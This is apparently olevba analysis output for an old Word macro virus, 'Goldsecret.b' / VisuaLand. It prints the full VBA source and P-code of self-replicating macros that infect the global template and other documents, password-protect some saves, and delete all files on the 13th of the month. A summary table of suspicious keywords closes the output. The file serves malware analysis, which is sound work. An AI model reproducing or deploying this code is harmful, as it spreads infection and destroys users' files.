olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Goldsecret.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Goldsecret.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Goldsecret.b - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "FileSaveAs\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If (dlg.Format = 0) Or (dlg.Format = 1) Then
    WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", WordBasic.[WindowName$]() + ":FileOpen", 1
    WordBasic.MacroCopy "VisuaLand", WordBasic.[WindowName$]() + ":VisuaLand", 1
    WordBasic.MacroCopy "MyMessage", WordBasic.[WindowName$]() + ":MyMessage", 1
    dlg.Format = 1
End If
If (WordBasic.Second(WordBasic.Now()) = 13) Then
    dlg.Password = "VisuaLand"
End If
WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Goldsecret.b - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "FileOpen\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
On Error GoTo -1: On Error GoTo InfError
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
  WordBasic.CurValues.FileOpen dlg
  WordBasic.Dialog.FileOpen dlg
  WordBasic.FileOpen dlg
  WordBasic.MacroCopy "AutoOpen", dlg.Name + ":AutoOpen", 1
  WordBasic.MacroCopy "FileSaveAs", dlg.Name + ":FileSaveAs", 1
  WordBasic.MacroCopy "FileOpen", dlg.Name + ":FileOpen", 1
  WordBasic.MacroCopy "VisuaLand", dlg.Name + ":VisuaLand", 1
  WordBasic.MacroCopy "MyMessage", dlg.Name + ":MyMessage", 1
  WordBasic.FileSaveAs Format:=1
InfError:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Goldsecret.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "AutoOpen\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim FN$
FN$ = WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    WordBasic.MacroCopy FN$ + ":FileSaveAs", "FileSaveAs", 1
    WordBasic.MacroCopy FN$ + ":FileOpen", "FileOpen", 1
    WordBasic.MacroCopy FN$ + ":AutoOpen", "AutoOpen", 1
    WordBasic.MacroCopy FN$ + ":VisuaLand", "VisuaLand", 1
    WordBasic.MacroCopy FN$ + ":MyMesaage", "MyMessage", 1
    WordBasic.SaveTemplate
End If
WordBasic.Call "VisuaLand"
ErrorInfectGlobalTemplate:
End Sub

Private Function CheckInfected()
Dim I
CheckInfected = 0
If (WordBasic.CountMacros(0) >= 5) Then
    For I = 1 To WordBasic.CountMacros(0)
        If (WordBasic.[MacroName$](I, 0) = "VisuaLand") Then
            CheckInfected = 1
        End If
    Next I
End If
End Function
-------------------------------------------------------------------------------
VBA MACRO VisuaLand.bas 
in file: ./Virus.MSWord.Goldsecret.b - OLE stream: 'Macros/VBA/VisuaLand'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "VisuaLand\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VisuaLand.MAIN"
On Error GoTo -1: On Error GoTo KillError
If WordBasic.Day(WordBasic.Now()) = 13 Then
    WordBasic.Kill "*.*"
    WordBasic.MsgBox "VisuaLand Technology is the BEST! ", "VisuaLand!", 16
    WordBasic.Call "MyMessage"
End If
WordBasic.Call "MyMessage"
KillError:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Goldsecret.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/FileSaveAs - 3778 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x0021 "       Virus: VisuaLand.2.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x002F "     VRating: Make First WordMacro.virii (Atom)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0031 "              (C) 1983-1994 Microsoft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x0035 "   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0038 "       Email: milky@dnet.net.id 'or' milky@visualand.com"
' Line #9:
' 	QuoteRem 0x0000 0x0027 "    Homepage: http://www.visualand.com/"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 02-02-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0022 "   VL Office: Visualand Technology"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x001C "       Phone: +62 21 5320382"
' Line #16:
' 	QuoteRem 0x0000 0x0034 "  Dedication: - Unknown (Atom was created by you???)"
' Line #17:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #18:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #19:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #20:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #21:
' Line #22:
' 	FuncDefn (Public Sub MAIN())
' Line #23:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #24:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #27:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	LitStr 0x0008 "FileOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #30:
' 	LitStr 0x0009 "VisuaLand"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":VisuaLand"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	LitStr 0x0009 "MyMessage"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":MyMessage"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	LitStr 0x0009 "VisuaLand"
' 	Ld dlg 
' 	MemSt Password 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #38:
' 	EndSub 
' Macros/VBA/FileOpen - 3602 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x0021 "       Virus: VisuaLand.2.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x002F "     VRating: Make First WordMacro.virii (Atom)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0031 "              (C) 1983-1994 Microsoft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x0035 "   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0038 "       Email: milky@dnet.net.id 'or' milky@visualand.com"
' Line #9:
' 	QuoteRem 0x0000 0x0027 "    Homepage: http://www.visualand.com/"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 02-02-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0022 "   VL Office: Visualand Technology"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x001C "       Phone: +62 21 5320382"
' Line #16:
' 	QuoteRem 0x0000 0x0034 "  Dedication: - Unknown (Atom was created by you???)"
' Line #17:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #18:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #19:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #20:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #21:
' Line #22:
' 	FuncDefn (Public Sub MAIN())
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError InfError 
' Line #24:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #26:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #28:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #30:
' 	LitStr 0x0008 "FileOpen"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	LitStr 0x0009 "VisuaLand"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x000A ":VisuaLand"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	LitStr 0x0009 "MyMessage"
' 	Ld dlg 
' 	MemLd New 
' 	LitStr 0x000A ":MyMessage"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #33:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #34:
' 	Label InfError 
' Line #35:
' 	EndSub 
' Macros/VBA/AutoOpen - 4056 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x0021 "       Virus: VisuaLand.2.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x002F "     VRating: Make First WordMacro.virii (Atom)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0031 "              (C) 1983-1994 Microsoft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x0035 "   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0038 "       Email: milky@dnet.net.id 'or' milky@visualand.com"
' Line #9:
' 	QuoteRem 0x0000 0x0027 "    Homepage: http://www.visualand.com/"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 02-02-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0022 "   VL Office: Visualand Technology"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x001C "       Phone: +62 21 5320382"
' Line #16:
' 	QuoteRem 0x0000 0x0034 "  Dedication: - Unknown (Atom was created by you???)"
' Line #17:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #18:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #19:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #20:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #21:
' Line #22:
' 	FuncDefn (Public Sub MAIN())
' Line #23:
' 	Dim 
' 	VarDefn FN
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrorInfectGlobalTemplate 
' Line #26:
' 	Ld CheckInfected 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #27:
' 	Ld FN$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	Ld FN$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x0008 "FileOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	Ld FN$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #30:
' 	Ld FN$ 
' 	LitStr 0x000A ":VisuaLand"
' 	Add 
' 	LitStr 0x0009 "VisuaLand"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	Ld FN$ 
' 	LitStr 0x000A ":MyMesaage"
' 	Add 
' 	LitStr 0x0009 "MyMessage"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall SaveTemplate 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	LitStr 0x0009 "VisuaLand"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #35:
' 	Label ErrorInfectGlobalTemplate 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Private Function CheckInfected())
' Line #39:
' 	Dim 
' 	VarDefn I
' Line #40:
' 	LitDI2 0x0000 
' 	St CheckInfected 
' Line #41:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0005 
' 	Ge 
' 	Paren 
' 	IfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #43:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "VisuaLand"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	St CheckInfected 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndFunc 
' Macros/VBA/VisuaLand - 3240 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x0021 "       Virus: VisuaLand.2.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x002F "     VRating: Make First WordMacro.virii (Atom)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0031 "              (C) 1983-1994 Microsoft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x0035 "   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0038 "       Email: milky@dnet.net.id 'or' milky@visualand.com"
' Line #9:
' 	QuoteRem 0x0000 0x0027 "    Homepage: http://www.visualand.com/"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 02-02-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0022 "   VL Office: Visualand Technology"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x001C "       Phone: +62 21 5320382"
' Line #16:
' 	QuoteRem 0x0000 0x0034 "  Dedication: - Unknown (Atom was created by you???)"
' Line #17:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #18:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #19:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #20:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #21:
' Line #22:
' 	FuncDefn (Public Sub MAIN())
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError KillError 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0003 "*.*"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #26:
' 	LitStr 0x0022 "VisuaLand Technology is the BEST! "
' 	LitStr 0x000A "VisuaLand!"
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #27:
' 	LitStr 0x0009 "MyMessage"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitStr 0x0009 "MyMessage"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #30:
' 	Label KillError 
' Line #31:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.visualand|URL                                          |
|          |.com/               |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

